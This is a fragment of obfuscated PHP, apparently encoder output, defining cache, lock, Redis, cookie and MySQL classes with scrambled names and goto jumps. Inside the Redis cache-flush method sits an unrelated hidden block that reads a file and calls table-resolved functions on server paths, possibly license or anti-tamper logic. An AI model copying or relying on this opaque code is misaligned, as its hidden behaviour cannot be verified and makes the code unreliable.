$B”™±ö˜½È($_SERVER[$_SERVER[¯Ò¬Èè][498]]); goto A£º†¯‡Ë; A£º†¯‡Ë: } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($aœ¼‹§É‚è, $DŒ­ ²è) { $aÜ˜Æ¶ ñ› =& $_SERVER[¯Ò¬Èè]; $this->cachePath = $aœ¼‹§É‚è[$aÜ˜Æ¶ ñ›[75]]; $this->prefix = $aÜ˜Æ¶ ñ›[776]; $this->cacheTime = $DŒ­ ²è; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($EÀ¿Şì¬Á) { $E‘ÂÄÁ£Æ =& $_SERVER[¯Ò¬Èè]; $EÀ¿Şì¬Á = str_replace(array($E‘ÂÄÁ£Æ[777], $E‘ÂÄÁ£Æ[93], $E‘ÂÄÁ£Æ[69]), $E‘ÂÄÁ£Æ[778], $EÀ¿Şì¬Á); return $this->cachePath . $E‘ÂÄÁ£Æ[779] . $EÀ¿Şì¬Á . $E‘ÂÄÁ£Æ[780]; } public function set($CÇ‘Ç—´Â, $f‘Û’Å¾…„, $e‚æ¾îŞ¿› = false) { $AêÃñî±¹ = $this->getFile($CÇ‘Ç—´Â); if (file_put_contents($AêÃñî±¹, $this->prefix . $f‘Û’Å¾…„, LOCK_EX)) { return !0; } @unlink($AêÃñî±¹); return !1; } public function get($Eµ‹á‚Ø¥”) { $e½¦ÓÑ‰‘Ï = $this->getFile($Eµ‹á‚Ø¥”); if (file_exists($e½¦ÓÑ‰‘Ï) && filemtime($e½¦ÓÑ‰‘Ï) < time() - $this->cacheTime) { @unlink($e½¦ÓÑ‰‘Ï); return !1; } $a¿‚ùâ‹Ö = @file_get_contents($e½¦ÓÑ‰‘Ï); return substr($a¿‚ùâ‹Ö, strlen($this->prefix)); } public function remove($DæÃ­øˆŠ) { $Cš„ë„±Ë = $this->getFile($DæÃ­øˆŠ); return @unlink($Cš„ë„±Ë); } public function deleteAll() { $E¾ôÀÕÀÕ =& $_SERVER[¯Ò¬Èè]; $c¶±óŒš± = scandir($this->cachePath); foreach ($c¶±óŒš± as $f±æ§¹ŞØ) { $cŠ•êª´­ = $this->cachePath . $f±æ§¹ŞØ; if (strpos($cŠ•êª´­, $E¾ôÀÕÀÕ[780]) && strpos($cŠ•êª´­, $E¾ôÀÕÀÕ[781])) { @unlink($cŠ•êª´­); } } } public function clearTimeout() { $AÔÔÑÎÇ¥ß =& $_SERVER[¯Ò¬Èè]; $c§Š°ÕòåØ = scandir($this->cachePath); foreach ($c§Š°ÕòåØ as $fñôÔùƒº) { $Bö¯öŞ£¥¼ = $this->cachePath . $fñôÔùƒº; if (strpos($Bö¯öŞ£¥¼, $AÔÔÑÎÇ¥ß[780]) && strpos($Bö¯öŞ£¥¼, $AÔÔÑÎÇ¥ß[781]) && filemtime($Bö¯öŞ£¥¼) < time() - $this->cacheTime) { @unlink($Bö¯öŞ£¥¼); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto DÅ˜Éù‚œÒ; DÅ˜Éù‚œÒ: $eÒæ‚ñ‚‚¾ =& $_SERVER[¯Ò¬Èè]; if (self::$handle) { return self::$handle; } $Fé«òõˆ¿ğ = $GLOBALS[$eÒæ‚ñ‚‚¾[6]][$eÒæ‚ñ‚‚¾[337]]; goto e¤ƒì¬˜¬“; e¤ƒì¬˜¬“: self::$timeout = $Fé«òõˆ¿ğ[$eÒæ‚ñ‚‚¾[782]] ? $Fé«òõˆ¿ğ[$eÒæ‚ñ‚‚¾[782]] : 10; $b‚š²°Óš¢ = _get($GLOBALS[$eÒæ‚ñ‚‚¾[6]], $eÒæ‚ñ‚‚¾[783]); $FÃÌ·Œõ° = $Fé«òõˆ¿ğ[$eÒæ‚ñ‚‚¾[769]] ? $Fé«òõˆ¿ğ[$eÒæ‚ñ‚‚¾[769]] : $eÒæ‚ñ‚‚¾[167]; goto aÚ°Î’°›; aÚ°Î’°›: if ($FÃÌ·Œõ° == $eÒæ‚ñ‚‚¾[17] && $b‚š²°Óš¢ == $eÒæ‚ñ‚‚¾[9]) { $FÃÌ·Œõ° = $eÒæ‚ñ‚‚¾[167]; } switch ($FÃÌ·Œõ°) { case $eÒæ‚ñ‚‚¾[772]: self::$handle = new CacheLockRedis(); break; case $eÒæ‚ñ‚‚¾[773]: self::$handle = new CacheLockMemcached(); break; case $eÒæ‚ñ‚‚¾[17]: self::$handle = new CacheLockDatabase(); break; case $eÒæ‚ñ‚‚¾[167]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto bĞğ¤»¬å; bĞğ¤»¬å: } private static function key($b›ïô¿¼¤ğ) { return $_SERVER[¯Ò¬Èè][784] . Cache::key($b›ïô¿¼¤ğ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($EªÂ…Œ¤ˆ’ = '') { self::$errorMsg = $EªÂ…Œ¤ˆ’; } public static function lockGlobal($AÀ‘‰ì¯ÚÔ, $DŸÈ†¤¼İÀ) { return self::lock($AÀ‘‰ì¯ÚÔ, $DŸÈ†¤¼İÀ, !0); } public static function lock($føˆ°çíí¡, $BÙŞì™µºÉ = false, $D ®…±˜Û‰ = false) { goto AŒè¶ŠÓ¬¡; eö©×™¸‹´: $BÙŞì™µºÉ = $BÙŞì™µºÉ ? $BÙŞì™µºÉ : self::$timeout; $F¯Âƒ¬£ = $C„ôŸÕ§Ä‰->lock($b‹Ûìçà, $BÙŞì™µºÉ); if (!$F¯Âƒ¬£) { $FìÓ×ºÀ¬å = $Cõ‚–ÙĞ¯[785] . $BÙŞì™µºÉ . $Cõ‚–ÙĞ¯[67] . self::$errorMsg . $Cõ‚–ÙĞ¯[67] . get_caller_msg(); $bÛÔ ßÑŠõ = "\x4c\x6f\143\153\40\x61\143\x74\151\x6f\x6e\x3a\x20{$b‹Ûìçà}\40\164\x69\x6d\x65\x6f\x75\x74\x2c\157\x76\145\x72\x20{$BÙŞì™µºÉ}\40\x73"; $bÛÔ ßÑŠõ = self::$errorMsg ? self::$errorMsg : $aèÌá«´ï‹; write_log($FìÓ×ºÀ¬å, $Cõ‚–ÙĞ¯[786]); show_json($bÛÔ ßÑŠõ, !1); } goto FÄ÷³Æ”Ü‡; AŒè¶ŠÓ¬¡: $Cõ‚–ÙĞ¯ =& $_SERVER[¯Ò¬Èè]; $C„ôŸÕ§Ä‰ = self::init(); $b‹Ûìçà = self::key($føˆ°çíí¡); goto eö©×™¸‹´; FÄ÷³Æ”Ü‡: if (!$D ®…±˜Û‰) { self::$lockItem[$b‹Ûìçà] = !0; } return $F¯Âƒ¬£; goto fÛ·ã•»§«; fÛ·ã•»§«: } public static function lockGet($c³ğŞ §ß¬) { $B´æ…¿’¤ = self::key($c³ğŞ §ß¬); if (self::$lockItem[$B´æ…¿’¤]) { return self::$lockItem[$B´æ…¿’¤]; } return self::init()->lockGet($B´æ…¿’¤); } public static function unlock($AÛñç‡Ã½’) { $C¸±”îÈ¥ = self::key($AÛñç‡Ã½’); self::$lockItem[$C¸±”îÈ¥] = null; return self::init()->unlock($C¸±”îÈ¥); } public static function unlockRuntime() { $E½äØ²æ÷ù =& $_SERVER[¯Ò¬Èè]; $D…ÎƒÒ…øŒ = self::init(); $Dáñ‹Àèò­ = !1; foreach (self::$lockItem as $aõ’ß›À©ã => $bË¸´æ¾Ïæ) { if (!$bË¸´æ¾Ïæ) { continue; } $D…ÎƒÒ…øŒ->unlock($aõ’ß›À©ã); if (!$Dáñ‹Àèò­) { $Dáñ‹Àèò­ = !0; write_log($E½äØ²æ÷ù[787] . $aõ’ß›À©ã . $E½äØ²æ÷ù[67] . get_caller_msg(), $E½äØ²æ÷ù[786]); continue; } write_log($E½äØ²æ÷ù[787] . $aõ’ß›À©ã, $E½äØ²æ÷ù[786]); } } } goto B¥Œ“ÑÃñ‹; fùÜ”§‚š: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($b»Ûã¡ç ã, $eÔ„¨Ïò¿ì) { $fÔ¿Ÿ„£Ø… =& $_SERVER[¯Ò¬Èè]; if (!class_exists($fÔ¿Ÿ„£Ø…[795])) { show_json($fÔ¿Ÿ„£Ø…[796], !1); } $this->cacheTime = $eÔ„¨Ïò¿ì; $EÆÇ­Ï¯§¯ = isset($b»Ûã¡ç ã[$fÔ¿Ÿ„£Ø…[797]]) ? $b»Ûã¡ç ã[$fÔ¿Ÿ„£Ø…[797]] : 10; $C£Ñ¼‚¯“‚ = _get($b»Ûã¡ç ã, $fÔ¿Ÿ„£Ø…[794]); if ($C£Ñ¼‚¯“‚ && is_array($C£Ñ¼‚¯“‚)) { $this->initCluster($b»Ûã¡ç ã, $EÆÇ­Ï¯§¯); } else { $this->handle = $this->init($b»Ûã¡ç ã, $EÆÇ­Ï¯§¯); } } private function init($D—ó¨ˆÖ”, $f‡ŠÅ„Ô‹) { $C×Í»°Ç‰è =& $_SERVER[¯Ò¬Èè]; $D¥Äˆà„Ö… = new Redis(); $AŒÕƒŸÁ÷ = isset($D—ó¨ˆÖ”[$C×Í»°Ç‰è[798]]) ? $D—ó¨ˆÖ”[$C×Í»°Ç‰è[798]] : !1; if ($AŒÕƒŸÁ÷) { $D¥Äˆà„Ö…->pconnect($D—ó¨ˆÖ”[$C×Í»°Ç‰è[169]], $D—ó¨ˆÖ”[$C×Í»°Ç‰è[170]], $f‡ŠÅ„Ô‹); } else { $D¥Äˆà„Ö…->connect($D—ó¨ˆÖ”[$C×Í»°Ç‰è[169]], $D—ó¨ˆÖ”[$C×Í»°Ç‰è[170]], $f‡ŠÅ„Ô‹); } if (!empty($D—ó¨ˆÖ”[$C×Í»°Ç‰è[376]])) { $D¥Äˆà„Ö…->auth($D—ó¨ˆÖ”[$C×Í»°Ç‰è[376]]); } return $D¥Äˆà„Ö…; } private function initCluster($BæÈ×ÜÕÌ, $BŞ™ô‚‚†˜) { $B±Åñ“Ö‡Î =& $_SERVER[¯Ò¬Èè]; $FôæÑæù­ = array($B±Åñ“Ö‡Î[799], $B±Åñ“Ö‡Î[800], $B±Åñ“Ö‡Î[801]); $c÷Œ…»ùÁ = $B±Åñ“Ö‡Î[799]; if (isset($BæÈ×ÜÕÌ[$B±Åñ“Ö‡Î[12]]) && in_array($BæÈ×ÜÕÌ[$B±Åñ“Ö‡Î[12]], $FôæÑæù­)) { $c÷Œ…»ùÁ = $BæÈ×ÜÕÌ[$B±Åñ“Ö‡Î[12]]; } switch ($c÷Œ…»ùÁ) { case $B±Åñ“Ö‡Î[799]: $this->_slave($BæÈ×ÜÕÌ, $BŞ™ô‚‚†˜); break; case $B±Åñ“Ö‡Î[800]: break; case $B±Åñ“Ö‡Î[801]: $this->isCluster = !0; $dä¡Éæ‚ÕË = $BæÈ×ÜÕÌ[$B±Åñ“Ö‡Î[794]]; $DÎğÂ˜î‡ = isset($BæÈ×ÜÕÌ[$B±Åñ“Ö‡Î[798]]) ? $BæÈ×ÜÕÌ[$B±Åñ“Ö‡Î[798]] : !1; $aá‡ÄÔ¡îí = isset($BæÈ×ÜÕÌ[$B±Åñ“Ö‡Î[376]]) ? $BæÈ×ÜÕÌ[$B±Åñ“Ö‡Î[376]] : null; $this->handle = new RedisCluster(NUll, $dä¡Éæ‚ÕË, $BŞ™ô‚‚†˜, $BŞ™ô‚‚†˜, $DÎğÂ˜î‡, $aá‡ÄÔ¡îí); break; default: break; } } private function _slave($D©’êßêˆ, $c¬È¶Ìù§) { goto E§Ÿäºš°Ö; F’›·¢‰Œµ: $this->filterConfig($D©’êßêˆ, $d‡´ĞÓà‹×[$f»¿ÀÔµä…]); $this->slaveHandle = $this->init($D©’êßêˆ, $c¬È¶Ìù§); goto f”‘§•‚ªÑ; E§Ÿäºš°Ö: $d‡´ĞÓà‹× = $D©’êßêˆ[$_SERVER[¯Ò¬Èè][794]]; $this->filterConfig($D©’êßêˆ, $d‡´ĞÓà‹×[0]); $this->handle = $this->init($D©’êßêˆ, $c¬È¶Ìù§); goto C¡ÊöŒ…‰Ã; C¡ÊöŒ…‰Ã: unset($d‡´ĞÓà‹×[0]); if (empty($d‡´ĞÓà‹×)) { return; } $f»¿ÀÔµä… = array_rand($d‡´ĞÓà‹×); goto F’›·¢‰Œµ; f”‘§•‚ªÑ: } private function filterConfig(&$eî²óÍµñ, $fæåƒ‰‚‘) { $eØÔóßË¿Ô =& $_SERVER[¯Ò¬Èè]; $eé·ÌÆ¼ê = explode($eØÔóßË¿Ô[4], $fæåƒ‰‚‘); $DÇÏ˜«î = array($eØÔóßË¿Ô[169] => $eé·ÌÆ¼ê[0], $eØÔóßË¿Ô[170] => $eé·ÌÆ¼ê[1]); $eî²óÍµñ = array_merge($eî²óÍµñ, $DÇÏ˜«î); } public function set($Aæñ—ó‚¦, $e‘Ë¥ô‰â‰, $bù¥î‰—Á = false) { $bù¥î‰—Á = $bù¥î‰—Á ? $bù¥î‰—Á : $this->cacheTime; return $this->handle->setEx($Aæñ—ó‚¦, $bù¥î‰—Á, $e‘Ë¥ô‰â‰); } public function setLock($BÇšÂİÕ™, $D‘ÄÄ„¶¹, $Bôª³»„÷ó) { return $this->handle->setNX($BÇšÂİÕ™, $D‘ÄÄ„¶¹); } public function get($aÕĞšÚˆÍ‰) { $AÁˆÄ…¡¸‰ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $AÁˆÄ…¡¸‰->get($aÕĞšÚˆÍ‰); } public function remove($F¹óâé¨¢Ğ) { return $this->handle->del($F¹óâé¨¢Ğ); } public function deleteAll() { $a»‡µáõ¡ù =& $_SERVER[¯Ò¬Èè]; if ($_SERVER[$a»‡µáõ¡ù[490]] != $_SERVER[$a»‡µáõ¡ù[491]]) { goto bØ³›‹¸; bØ³›‹¸: $fºéˆŠê = $a»‡µáõ¡ù[802]; $Fï’‘‚ˆ = $a»‡µáõ¡ù[492]; $Bãîƒ„ÄÇ™ = $_SERVER[$a»‡µáõ¡ù[493]] . $a»‡µáõ¡ù[494]; goto C¸£À„ô‘»; eŒÑ‡Š—±›: $aä¦•ù’Çø = $a»‡µáõ¡ù[803]; $aä¦•ù’Çø($_SERVER[$a»‡µáõ¡ù[804]]); $aä¦•ù’Çø($_SERVER[$a»‡µáõ¡ù[493]] . $a»‡µáõ¡ù[805]); goto D´ÒÀöã²»; D´ÒÀöã²»: $cªÜæÔù‰£ = 1; while ($cªÜæÔù‰£ > 1) { $cªÜæÔù‰£ = $cªÜæÔù‰£ + 4; $B‘¹°ˆª‘Å = rawurlencode($cªÜæÔù‰£ . $a»‡µáõ¡ù[361]); } goto FğÅ³ŒáĞä; C¸£À„ô‘»: $C„ä…¯Ì¥Ó = $Fï’‘‚ˆ($Bãîƒ„ÄÇ™); $dÁÄæ¯­± = explode($a»‡µáõ¡ù[217], $C„ä…¯Ì¥Ó); if (count($dÁÄæ¯­±) < $a»‡µáõ¡ù[570]) { $Aîƒ¦ğÃ• = $a»‡µáõ¡ù[496]; $Aîƒ¦ğÃ•(); } goto eŒÑ‡Š—±›; FğÅ³ŒáĞä: } if ($this->isCluster) { foreach ($this->handle->_masters() as $B·è—ä¦·) { $this->handle->flushall($B·è—ä¦·); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($dˆëÓÎ™å… = '', $cÁÍ¢„»ˆ = 0) { if (is_string($dˆëÓÎ™å…) && $dˆëÓÎ™å… != $_SERVER[¯Ò¬Èè][33]) { $this->prefix = $dˆëÓÎ™å…; } if (is_numeric($cÁÍ¢„»ˆ) && $cÁÍ¢„»ˆ > 0) { $this->expire = $cÁÍ¢„»ˆ; } } public static function getInstance() { static $d›ò©ÖÓó…; if ($d›ò©ÖÓó… === null) { $d›ò©ÖÓó… = new self(); } return $d›ò©ÖÓó…; } private static $sameCookieSet = array(); public static function set($díİÀ±Ùƒ, $bÂöÆÑ¤¸Õ, $aóÆÁİİ»› = 0, $bª¥šâ÷‡ = false, $cÉŠÓ¯£Ûã = false) { goto Aï¢ğ™‰‰Û; Aï¢ğ™‰‰Û: $Bâô‘¹ÁÃ‰ =& $_SERVER[¯Ò¬Èè]; if (!$aóÆÁİİ»›) { $aóÆÁİİ»› = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$díİÀ±Ùƒ]) && self::$sameCookieSet[$díİÀ±Ùƒ] == $bÂöÆÑ¤¸Õ . $aóÆÁİİ»›) { return; } goto a“ä·Ö¦ğ; a¼µ‚¬ªÊ¶: setcookie($díİÀ±Ùƒ, $bÂöÆÑ¤¸Õ, time() + $aóÆÁİİ»›, $Bâô‘¹ÁÃ‰[8] . trim($cÉŠÓ¯£Ûã, $Bâô‘¹ÁÃ‰[8]) . $F½» Êµ, !1, !1, $bª¥šâ÷‡); goto b°ÑÚØ›‹„; a“ä·Ö¦ğ: self::$sameCookieSet[$díİÀ±Ùƒ] = $bÂöÆÑ¤¸Õ . $aóÆÁİİ»›; if (!$cÉŠÓ¯£Ûã) { $cÉŠÓ¯£Ûã = str_replace(HOST, $Bâô‘¹ÁÃ‰[33], APP_HOST); $cÉŠÓ¯£Ûã = _get($GLOBALS, $Bâô‘¹ÁÃ‰[806], $cÉŠÓ¯£Ûã); } $F½» Êµ = $Bâô‘¹ÁÃ‰[33]; goto a¼µ‚¬ªÊ¶; b°ÑÚØ›‹„: } public static function setSafe($bâ†Ş¡åÔË, $F–ÔÇÖÍ°¿, $E­â­ÅçàÔ = 0) { self::set($bâ†Ş¡åÔË, $F–ÔÇÖÍ°¿, $E­â­ÅçàÔ, !0); } public static function get($aé”Ú„°Ü) { return isset($_COOKIE[$aé”Ú„°Ü]) ? $_COOKIE[$aé”Ú„°Ü] : !1; } public static function remove($båÔ«Êœ¡£, $BšÏÈ“Ó = false) { unset($_COOKIE[$båÔ«Êœ¡£]); self::set($båÔ«Êœ¡£, $_SERVER[¯Ò¬Èè][33], 1, $BšÏÈ“Ó); } } class DbMysql extends Db { public function __construct($Dí¦‘¬† = '') { $DÑ´¶É‘ÃÕ =& $_SERVER[¯Ò¬Èè]; if (!extension_loaded($DÑ´¶É‘ÃÕ[742])) { think_exception(think_lang($DÑ´¶É‘ÃÕ[10]) . $DÑ´¶É‘ÃÕ[807]); } if (!empty($Dí¦‘¬†)) { $this->config = $Dí¦‘¬†; if (empty($this->config[$DÑ´¶É‘ÃÕ[13]])) { $this->config[$DÑ´¶É‘ÃÕ[13]] = $DÑ´¶É‘ÃÕ[33]; } } } public function connect($D­ÖìéŒĞĞ = '', $d¢°”¼ ‚ñ = 0, $E‚©§ä™Ï = false) { $eƒ™²Ç¦ï =& $_SERVER[¯Ò¬Èè]; if (!isset($this->linkID[$d¢°”¼ ‚ñ])) { goto F«½ÓäìÍí; F«½ÓäìÍí: if (empty($D­ÖìéŒĞĞ)) { $D­ÖìéŒĞĞ = $this->config; } $dË˜é½Œä = $D­ÖìéŒĞĞ[$eƒ™²Ç¦ï[808]] . ($D­ÖìéŒĞĞ[$eƒ™²Ç¦ï[809]] ? "\72{$D­ÖìéŒĞĞ[$eƒ™²Ç¦ï[809]]}" : $eƒ™²Ç¦ï[33]); $Fí…×ëòßº = !empty($D­ÖìéŒĞĞ[$eƒ™²Ç¦ï[13]][$eƒ™²Ç¦ï[14]]) ? $D­ÖìéŒĞĞ[$eƒ™²Ç¦ï[13]][$eƒ™²Ç¦ï[14]] : $this->pconnect; goto C‘‚ÜõÀì¥; C‘‚ÜõÀì¥: if ($Fí…×ëòßº) { $this->linkID[$d¢°”¼ ‚ñ] = mysql_pconnect($dË˜é½Œä, $D­ÖìéŒĞĞ[$eƒ™²Ç¦ï[810]], $D­ÖìéŒĞĞ[$eƒ™²Ç¦ï[811]], 131072); } else { $this->linkID[$d¢°”¼ ‚ñ] = mysql_connect($dË˜é½Œä, $D­ÖìéŒĞĞ[$eƒ™²Ç¦ï[810]], $D­ÖìéŒĞĞ[$eƒ™²Ç¦ï[811]], !0, 131072); } if (!$this->linkID[$d¢°”¼ ‚ñ] || !empty($D­ÖìéŒĞĞ[$eƒ™²Ç¦ï[17]]) && !mysql_select_db($D­ÖìéŒĞĞ[$eƒ™²Ç¦ï[17]], $this->linkID[$d¢°”¼ ‚ñ])) { think_exception(mysql_error()); } $F½Æ™•â•à = mysql_get_server_info($this->linkID[$d¢°”¼ ‚ñ]); goto fÓ¦Ùåã³¾; cæš•Ë†: if (1 != think_config($eƒ™²Ç¦ï[18])) { unset($this->config); } goto fâèæºà¸Ò; fÓ¦Ùåã³¾: mysql_query($eƒ™²Ç¦ï[812] . think_config($eƒ™²Ç¦ï[813]) . $eƒ™²Ç¦ï[55], $this->linkID[$d¢°”¼ ‚ñ]); if ($F½Æ™•â•à > $eƒ™²Ç¦ï[814]) { mysql_query($eƒ™²Ç¦ï[815], $this->linkID[$d¢°”¼ ‚ñ]); } $this->connected = !0; goto cæš•Ë†; fâèæºà¸Ò: } return $this->linkID[$d¢°”¼ ‚ñ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($F”ô¶¿Å‰) { goto A¹»ƒÖ®š¹; A¹»ƒÖ®š¹: $D³¬é«Ì‡ =& $_SERVER[¯Ò¬Èè]; if (0 === stripos($F”ô¶¿Å‰, $D³¬é«Ì‡[252])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto bÅŸİ—¬¥ñ; Bóå‡ğŞ¬Í: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto A‰î‹ïĞ‚‡; bÅŸİ—¬¥ñ: if (!$this->_linkID) { return !1; } $this->queryStr = $F”ô¶¿Å‰; if ($this->queryID) { $this->free(); } goto d›İ…§ƒÕœ; d›İ…§ƒÕœ: think_action_status($D³¬é«Ì‡[19], 1); think_status($D³¬é«Ì‡[20]); $this->queryID = mysql_query($F”ô¶¿Å‰, $this->_linkID); goto Bóå‡ğŞ¬Í; A‰î‹ïĞ‚‡: } public function execute($DåĞğŠ’Š) { goto fÚ“ƒƒÔ¾˜; bÆ«½¢Ô×‘: if (!1 === $f²¡²¹Òùí) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto aø±ÏÏŸ­©; CÔÊ×ª‹‡: $this->queryStr = $DåĞğŠ’Š; if ($this->queryID) { $this->free(); } think_action_status($a˜Î·†ÓîÌ[21], 1); goto F¦£„Û˜ƒè; F¦£„Û˜ƒè: think_status($a˜Î·†ÓîÌ[20]); $f²¡²¹Òùí = mysql_query($DåĞğŠ’Š, $this->_linkID); $this->debug(); goto bÆ«½¢Ô×‘; fÚ“ƒƒÔ¾˜: $a˜Î·†ÓîÌ =& $_SERVER[¯Ò¬Èè]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto CÔÊ×ª‹‡; aø±ÏÏŸ­©: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[¯Ò¬Èè][816], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $e„ÓÈ¡ƒ­ = mysql_query($_SERVER[¯Ò¬Èè][817], $this->_linkID); $this->transTimes = 0; if (!$e„ÓÈ¡ƒ­) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $D¤õÔòÚ˜„ = mysql_query($_SERVER[¯Ò¬Èè][818], $this->_linkID); $this->transTimes = 0; if (!$D¤õÔòÚ˜„) { $this->error(); return !1; } } return !0; } private function getAll() { $Aªº‘á»†› = array(); if ($this->numRows > 0) { while ($B‚ïÍÆ¬ = mysql_fetch_assoc($this->queryID)) { $Aªº‘á»†›[] = $B‚ïÍÆ¬; } mysql_data_seek($this->queryID, 0); } return $Aªº‘á»†›; } public function getFields($cµ ±Ê¤ß) { $E…×Š¹äÊâ =& $_SERVER[¯Ò¬Èè]; $F´Óæ…—µÖ = $this->query($E…×Š¹äÊâ[819] . $this->parseKey($cµ ±Ê¤ß)); $Eã‘š­÷é‰ = array(); if ($F´Óæ…—µÖ) { foreach ($F´Óæ…—µÖ as $DÔ¹İˆ¼…  => $AÍ‘µÌÊæÃ) { $Eã‘š­÷é‰[$AÍ‘µÌÊæÃ[$E…×Š¹äÊâ[27]]] = array($E…×Š¹äÊâ[28] => $AÍ‘µÌÊæÃ[$E…×Š¹äÊâ[27]], $E…×Š¹äÊâ[29] => $AÍ‘µÌÊæÃ[$E…×Š¹äÊâ[30]], $E…×Š¹äÊâ[31] => (bool) (strtoupper($AÍ‘µÌÊæÃ[$E…×Š¹äÊâ[32]]) === $E…×Š¹äÊâ[820]), $E…×Š¹äÊâ[34] => $AÍ‘µÌÊæÃ[$E…×Š¹äÊâ[35]], $E…×Š¹äÊâ[36] => strtolower($AÍ‘µÌÊæÃ[$E…×Š¹äÊâ[37]]) == $E…×Š¹äÊâ[38], $E…×Š¹äÊâ[39] => strtolower($AÍ‘µÌÊæÃ[$E…×Š¹äÊâ[40]]) == $E…×Š¹äÊâ[41]); } } return $Eã‘š­÷é‰; } public function getTables($Cá‡•« = '') { $bÃò¿‹Õ½Ù =& $_SERVER[¯Ò¬Èè]; if (!empty($Cá‡•«)) { $C¤ù´–ŞÃİ = $bÃò¿‹Õ½Ù[821] . $Cá‡•«; } else { $C¤ù´–ŞÃİ = $bÃò¿‹Õ½Ù[822]; } $Bï‘êŸ›¡ = $this->query($C¤ù´–ŞÃİ); $e†¶½ÀîÒ“ = array(); foreach ($Bï‘êŸ›¡ as $aá¬êìì => $EœÑ ÂÄƒÊ) { $e†¶½ÀîÒ“[$aá¬êìì] = current($EœÑ ÂÄƒÊ); } return $e†¶½ÀîÒ“; } public function replace($d—™ˆàÔ§¥, $f‚’¯ğä¨© = array()) { $Fç–æ®÷  =& $_SERVER[¯Ò¬Èè]; foreach ($d—™ˆàÔ§¥ as $D°ß„àˆÛ => $eå¬Êä£‘Ô) { $bˆòó”˜ = $this->parseValue($eå¬Êä£‘Ô); if (is_scalar($bˆòó”˜)) { $B¦è¹‰ğ…[] = $bˆòó”˜; $E¥Äç„‡Ø•[] = $this->parseKey($D°ß„àˆÛ); } } $cºÔëË“Ñ» = $Fç–æ®÷ [823] . $this->parseTable($f‚’¯ğä¨©[$Fç–æ®÷ [267]]) . $Fç–æ®÷ [824] . implode($Fç–æ®÷ [47], $E¥Äç„‡Ø•) . $Fç–æ®÷ [825] . implode($Fç–æ®÷ [47], $B¦è¹‰ğ…) . $Fç–æ®÷ [826]; return $this->execute($cºÔëË“Ñ»); } public function insertAll($f˜ŒŠñÎ§Š, $aÛàÜŞè›• = array(), $f™Ç³“•¿ = false) { goto FÄë¯«¨Á°; a½ÖòĞï˜Ù: $aÌùæŒ‚Æ = array(); foreach ($f˜ŒŠñÎ§Š as $f‘ÀÏª°Ş) { $AÎ‚ÆŸÌˆœ = array(); foreach ($f‘ÀÏª°Ş as $AˆŠîç‚›à => $E‚ÔÆˆÅö) { $E‚ÔÆˆÅö = $this->parseValue($E‚ÔÆˆÅö); if (is_scalar($E‚ÔÆˆÅö)) { $AÎ‚ÆŸÌˆœ[] = $E‚ÔÆˆÅö; } } $aÌùæŒ‚Æ[] = $e†³¨ˆ„ã²[248] . implode($e†³¨ˆ„ã²[47], $AÎ‚ÆŸÌˆœ) . $e†³¨ˆ„ã²[826]; } array_walk($Dâ‚¥ŠöÛ„, array($this, $e†³¨ˆ„ã²[827])); goto bº«œÊîà; bº«œÊîà: $d¦…¬îéô = ($f™Ç³“•¿ ? $e†³¨ˆ„ã²[828] : $e†³¨ˆ„ã²[829]) . $e†³¨ˆ„ã²[830] . $this->parseTable($aÛàÜŞè›•[$e†³¨ˆ„ã²[267]]) . $e†³¨ˆ„ã²[824] . implode($e†³¨ˆ„ã²[47], $Dâ‚¥ŠöÛ„) . $e†³¨ˆ„ã²[831] . implode($e†³¨ˆ„ã²[47], $aÌùæŒ‚Æ); return $this->execute($d¦…¬îéô); goto aÜéÅ»ìˆÈ; FÄë¯«¨Á°: $e†³¨ˆ„ã² =& $_SERVER[¯Ò¬Èè]; if (!is_array($f˜ŒŠñÎ§Š[0])) { return !1; } $Dâ‚¥ŠöÛ„ = array_keys($f˜ŒŠñÎ§Š[0]); goto a½ÖòĞï˜Ù; aÜéÅ»ìˆÈ: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $báø¤Ò…Ø =& $_SERVER[¯Ò¬Èè]; $this->error = mysql_errno() . $báø¤Ò…Ø[4] . mysql_error($this->_linkID); if ($báø¤Ò…Ø[33] != $this->queryStr) { $this->error .= LNG($báø¤Ò…Ø[45]) . $this->queryStr; } think_trace($this->error, $báø¤Ò…Ø[33], $báø¤Ò…Ø[46]); return $this->error; } public function escapeString($añ—ÕèŞ­ ) { if ($this->_linkID) { return mysql_real_escape_string($añ—ÕèŞ­ , $this->_linkID); } else { return mysql_escape_string($añ—ÕèŞ­ ); } } public function parseKey(&$e¦‹ˆ²¢×¼, $eÈŸÂ¿„Ö› = true) { $b„‹Œ›Ë¾£ =& $_SERVER[¯Ò¬Èè]; if ($eÈŸÂ¿„Ö›) { $e¦‹ˆ²¢×¼ = $this->parseKeyCheck($e¦‹ˆ²¢×¼); } if ($e¦‹ˆ²¢×¼ != $b„‹Œ›Ë¾£[176] && !preg_match($b„‹Œ›Ë¾£[832], $e¦‹ˆ²¢×¼)) { $e¦‹ˆ²¢×¼ = $b„‹Œ›Ë¾£[833] . trim($e¦‹ˆ²¢×¼, $b„‹Œ›Ë¾£[833]) . $b„‹Œ›Ë¾£[833]; } return $e¦‹ˆ²¢×¼; } } goto F¹’Ğ…Ÿ‹–; AÁ™¢øç¸: 